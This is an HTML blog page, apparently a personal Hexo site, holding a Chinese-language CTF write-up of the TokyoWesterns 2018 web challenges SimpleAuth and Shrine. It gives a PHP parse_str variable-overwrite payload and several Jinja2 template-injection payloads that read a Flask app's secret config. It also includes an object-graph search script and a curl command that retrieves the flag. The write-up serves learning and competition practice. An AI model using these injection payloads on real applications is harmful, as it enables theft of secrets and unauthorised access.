@@ -1,0 +1,731 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.1" />
+
+
+
+
+
+
+<meta name="description" content="复现几道">
+<meta name="keywords">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TokyoWesternswp">
+<meta property="og:url" content="http://Merl1ng.com/2018/09/06/TokyoWesternswp/index.html">
+<meta property="og:site_name" content="Merl1ng's blog">
+<meta property="og:description" content="复现几道">
+<meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/xiuxiuxiuxiuxiu.PNG">
+<meta property="og:updated_time" content="2018-09-10T14:25:42.298Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="TokyoWesternswp">
+<meta name="twitter:description" content="复现几道">
+<meta name="twitter:image" content="http://otvzfr1o1.bkt.clouddn.com/xiuxiuxiuxiuxiu.PNG">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    sidebar: {"position":"left","display":"always","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://Merl1ng.com/2018/09/06/TokyoWesternswp/"/>
+
+
+
+
+
+  <title>TokyoWesternswp | Merl1ng's blog</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Merl1ng's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://Merl1ng.com/2018/09/06/TokyoWesternswp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Merl1ng">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Merl1ng's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">TokyoWesternswp</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-06T16:29:21+08:00">
+                2018-09-06
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>复现几道<br><a id="more"></a></p>
+<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="SimpleAuth"><a href="#SimpleAuth" class="headerlink" title="SimpleAuth"></a>SimpleAuth</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line">&gt;  &lt;?php</div><div class="line">&gt; </div><div class="line">&gt; require_once <span class="string">'flag.php'</span>;</div><div class="line">&gt; </div><div class="line">&gt; <span class="keyword">if</span> (!empty(<span class="variable">$_SERVER</span>[<span class="string">'QUERY_STRING'</span>])) &#123;</div><div class="line">&gt;     <span class="variable">$query</span> = <span class="variable">$_SERVER</span>[<span class="string">'QUERY_STRING'</span>];</div><div class="line">&gt;     <span class="variable">$res</span> = parse_str(<span class="variable">$query</span>);</div><div class="line">&gt;     <span class="keyword">if</span> (!empty(<span class="variable">$res</span>[<span class="string">'action'</span>]))&#123;</div><div class="line">&gt;         <span class="variable">$action</span> = <span class="variable">$res</span>[<span class="string">'action'</span>];</div><div class="line">&gt;     &#125;</div><div class="line">&gt; &#125;</div><div class="line">&gt; </div><div class="line">&gt; <span class="keyword">if</span> (<span class="variable">$action</span> === <span class="string">'auth'</span>) &#123;</div><div class="line">&gt;     <span class="keyword">if</span> (!empty(<span class="variable">$res</span>[<span class="string">'user'</span>])) &#123;</div><div class="line">&gt;         <span class="variable">$user</span> = <span class="variable">$res</span>[<span class="string">'user'</span>];</div><div class="line">&gt;     &#125;</div><div class="line">&gt;     <span class="keyword">if</span> (!empty(<span class="variable">$res</span>[<span class="string">'pass'</span>])) &#123;</div><div class="line">&gt;         <span class="variable">$pass</span> = <span class="variable">$res</span>[<span class="string">'pass'</span>];</div><div class="line">&gt;     &#125;</div><div class="line">&gt; </div><div class="line">&gt;     <span class="keyword">if</span> (!empty(<span class="variable">$user</span>) &amp;&amp; !empty(<span class="variable">$pass</span>)) &#123;</div><div class="line">&gt;         <span class="variable">$hashed_password</span> = <span class="built_in">hash</span>(<span class="string">'md5'</span>, <span class="variable">$user</span>.<span class="variable">$pass</span>);</div><div class="line">&gt;     &#125;</div><div class="line">&gt;     <span class="keyword">if</span> (!empty(<span class="variable">$hashed_password</span>) &amp;&amp; <span class="variable">$hashed_password</span> === <span class="string">'c019f6e5cd8aa0bbbcc6e994a54c757e'</span>) &#123;</div><div class="line">&gt;         <span class="built_in">echo</span> <span class="variable">$flag</span>;</div><div class="line">&gt;     &#125;</div><div class="line">&gt;     <span class="keyword">else</span> &#123;</div><div class="line">&gt;         <span class="built_in">echo</span> <span class="string">'fail :('</span>;</div><div class="line">&gt;     &#125;</div><div class="line">&gt; &#125;</div><div class="line">&gt; <span class="keyword">else</span> &#123;</div><div class="line">&gt;     highlight_file(__FILE__);</div><div class="line">&gt; &#125;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>考点是parse_str的变量覆盖漏洞</p>
+<p>正常情况下是做不到</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (!empty(<span class="variable">$user</span>) &amp;&amp; !empty(<span class="variable">$pass</span>)) &#123;</div><div class="line">    <span class="variable">$hashed_password</span> = <span class="built_in">hash</span>(<span class="string">'md5'</span>, <span class="variable">$user</span>.<span class="variable">$pass</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>但如果 pasre_str没加result参数 parse_str函数的作用就是解析字符串并注册成变量，在注册变量之前不会验证当前变量是否存在，所以直接覆盖掉已有变量</p>
+<p>所以直接传就行</p>
+<p>?action=auth&amp;hashed_password=c019f6e5cd8aa0bbbcc6e994a54c757e</p>
+<p>变量覆盖漏洞还有可能出现在 extract() import_request_variables()<br>参考<br><a href="https://www.cnblogs.com/sqyysec/p/6926095.html" target="_blank" rel="external">https://www.cnblogs.com/sqyysec/p/6926095.html</a></p>
+<h3 id="Shrine"><a href="#Shrine" class="headerlink" title="Shrine"></a>Shrine</h3><p>又是个py沙盒 py3的</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">import flask</div><div class="line">import os</div><div class="line"></div><div class="line"></div><div class="line">app = flask.Flask(__name__)</div><div class="line">app.config[<span class="string">'FLAG'</span>] = os.environ.pop(<span class="string">'FLAG'</span>)</div><div class="line"></div><div class="line">@app.route(<span class="string">'/'</span>)</div><div class="line">def index():</div><div class="line">    <span class="built_in">return</span> open(__file__).read()</div><div class="line"></div><div class="line">@app.route(<span class="string">'/shrine/&lt;path:shrine&gt;'</span>)</div><div class="line">def shrine(shrine):</div><div class="line">    def safe_jinja(s):</div><div class="line">        s = s.replace(<span class="string">'('</span>, <span class="string">''</span>).replace(<span class="string">')'</span>, <span class="string">''</span>)</div><div class="line">        blacklist = [<span class="string">'config'</span>, <span class="string">'self'</span>]</div><div class="line">        <span class="built_in">return</span> <span class="string">''</span>.join([<span class="string">'&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'</span>.format(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist])+s</div><div class="line">    <span class="built_in">return</span> flask.render_template_string(safe_jinja(shrine))</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    app.run(debug=True)</div></pre></td></tr></table></figure>
+<p>算是比较狠的过滤了 ()没了很关键 如果有的话可以</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">( and )</div><div class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[68].__init__.__globals__[<span class="string">'os'</span>].__dict__.environ[<span class="string">'FLAG]&#125;&#125;</span></div></pre></td></tr></table></figure>
+<p>得对flask比较熟悉才行 最终用的</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">GET /shrine/&#123;&#123;url_for.__globals__[<span class="string">'current_app'</span>].config[<span class="string">'FLAG'</span>]&#125;&#125;</div><div class="line">or</div><div class="line"></div><div class="line">GET /shrine/&#123;&#123;get_flashed_messages.__globals__[<span class="string">'current_app'</span>].config[<span class="string">'FLAG'</span>]&#125;&#125;</div></pre></td></tr></table></figure>
+<p>还有一个更牛逼的做法 自动化查询 本地搭建环境测试 懒得敲了直接贴过来</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div></pre></td><td class="code"><pre><div class="line">虽然config并且self未设置，request但仍然可用。我相信app.config可能在某个地方..为了搜索它，我编写了一个函数来遍历request递归的子属性：</div><div class="line"></div><div class="line"><span class="comment"># search.py</span></div><div class="line"></div><div class="line">def search(obj, max_depth):</div><div class="line">    </div><div class="line">    visited_clss = []</div><div class="line">    visited_objs = []</div><div class="line">    </div><div class="line">    def visit(obj, path=<span class="string">'obj'</span>, depth=0):</div><div class="line">        yield path, obj</div><div class="line">        </div><div class="line">        <span class="keyword">if</span> depth == max_depth:</div><div class="line">            <span class="built_in">return</span></div><div class="line"></div><div class="line">        <span class="keyword">elif</span> isinstance(obj, (int, <span class="built_in">float</span>, bool, str, bytes)):</div><div class="line">            <span class="built_in">return</span></div><div class="line"></div><div class="line">        <span class="keyword">elif</span> isinstance(obj, <span class="built_in">type</span>):</div><div class="line">            <span class="keyword">if</span> obj <span class="keyword">in</span> visited_clss:</div><div class="line">                <span class="built_in">return</span></div><div class="line">            visited_clss.append(obj)</div><div class="line">            <span class="built_in">print</span>(obj)</div><div class="line"></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="keyword">if</span> obj <span class="keyword">in</span> visited_objs:</div><div class="line">                <span class="built_in">return</span></div><div class="line">            visited_objs.append(obj)</div><div class="line">        </div><div class="line">        <span class="comment"># attributes</span></div><div class="line">        <span class="keyword">for</span> name <span class="keyword">in</span> dir(obj):</div><div class="line">            <span class="keyword">if</span> name.startswith(<span class="string">'__'</span>) and name.endswith(<span class="string">'__'</span>):</div><div class="line">                <span class="keyword">if</span> name not <span class="keyword">in</span>  (<span class="string">'__globals__'</span>, <span class="string">'__class__'</span>, <span class="string">'__self__'</span>,</div><div class="line">                                 <span class="string">'__weakref__'</span>, <span class="string">'__objclass__'</span>, <span class="string">'__module__'</span>):</div><div class="line">                    <span class="built_in">continue</span></div><div class="line">            attr = getattr(obj, name)</div><div class="line">            yield from visit(attr, <span class="string">'&#123;&#125;.&#123;&#125;'</span>.format(path, name), depth + 1)</div><div class="line">        </div><div class="line">        <span class="comment"># dict values</span></div><div class="line">        <span class="keyword">if</span> hasattr(obj, <span class="string">'items'</span>) and callable(obj.items):</div><div class="line">            try:</div><div class="line">                <span class="keyword">for</span> k, v <span class="keyword">in</span> obj.items():</div><div class="line">                    yield from visit(v, <span class="string">'&#123;&#125;[&#123;&#125;]'</span>.format(path, repr(k)), depth)</div><div class="line">            except:</div><div class="line">                pass</div><div class="line">        </div><div class="line">        <span class="comment"># items</span></div><div class="line">        <span class="keyword">elif</span> isinstance(obj, (<span class="built_in">set</span>, list, tuple, frozenset)):</div><div class="line">            <span class="keyword">for</span> i, v <span class="keyword">in</span> enumerate(obj):</div><div class="line">                yield from visit(v, <span class="string">'&#123;&#125;[&#123;&#125;]'</span>.format(path, repr(i)), depth)</div><div class="line">            </div><div class="line">    yield from visit(obj)</div><div class="line">修改app.py：</div><div class="line"></div><div class="line">import flask</div><div class="line">import os</div><div class="line"></div><div class="line">from flask import request</div><div class="line">from search import search</div><div class="line"></div><div class="line">app = flask.Flask(__name__)</div><div class="line">app.config[<span class="string">'FLAG'</span>] = <span class="string">'TWCTF_FLAG'</span></div><div class="line"></div><div class="line">@app.route(<span class="string">'/'</span>)</div><div class="line">def index():</div><div class="line">    <span class="built_in">return</span> open(__file__).read()</div><div class="line"></div><div class="line">@app.route(<span class="string">'/shrine/&lt;path:shrine&gt;'</span>)</div><div class="line">def shrine(shrine):</div><div class="line">    <span class="keyword">for</span> path, obj <span class="keyword">in</span> search(request, 10):</div><div class="line">        <span class="keyword">if</span> str(obj) == app.config[<span class="string">'FLAG'</span>]:</div><div class="line">            <span class="built_in">return</span> path</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    app.run(debug=True)</div><div class="line"></div><div class="line">$ python3 app.py &amp;</div><div class="line"></div><div class="line">$ curl 0:5000/shrine/123</div><div class="line">obj.application.__self__._get_data_for_json.__globals__[<span class="string">'json'</span>].JSONEncoder.default.__globals__[<span class="string">'current_app'</span>].config[<span class="string">'FLAG'</span>]</div><div class="line"></div><div class="line">$ curl -g <span class="string">"http://shrine.chal.ctf.westerns.tokyo/shrine/&#123;&#123;request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config['FLAG']&#125;&#125;"</span></div><div class="line">TWCTF&#123;pray_f0r_sacred_jinja2&#125;</div></pre></td></tr></table></figure>
+<p>我擦全自动出结果 把我秀哭了</p>
+<p><img src="http://otvzfr1o1.bkt.clouddn.com/xiuxiuxiuxiuxiu.PNG" alt=""></p>
+<p>参考<br><a href="https://ctftime.org/writeup/10895" target="_blank" rel="external">https://ctftime.org/writeup/10895</a><br><a href="https://ctftime.org/writeup/10851" target="_blank" rel="external">https://ctftime.org/writeup/10851</a></p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/09/09/noxctfwp/" rel="next" title="noxctfwp">
+                <i class="fa fa-chevron-left"></i> noxctfwp
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/08/28/巅峰极客第二场wp/" rel="prev" title="巅峰极客第二场wp">
+                巅峰极客第二场wp <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.gif"
+               alt="Merl1ng" />
+          <p class="site-author-name" itemprop="name">Merl1ng</p>
+           
+              <p class="site-description motion-element" itemprop="description">Love life , love gakki !</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives/">
+                <span class="site-state-item-count">73</span>
+                <span class="site-state-item-name">posts</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">7</span>
+                <span class="site-state-item-name">categories</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">24</span>
+                <span class="site-state-item-name">tags</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/Merl1ng" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://twitter.com/Merl1ng" target="_blank" title="Twitter">
+                  
+                    <i class="fa fa-fw fa-twitter"></i>
+                  
+                  Twitter
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#web"><span class="nav-number">1.</span> <span class="nav-text">web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SimpleAuth"><span class="nav-number">1.1.</span> <span class="nav-text">SimpleAuth</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Shrine"><span class="nav-number">1.2.</span> <span class="nav-text">Shrine</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Merl1ng</span>
+</div>
+
+
+<div class="powered-by">
+   Love life 
+</div>
+
+<div class="theme-info">
+  Love gakki 
+  
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
+
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/love.js"></script>
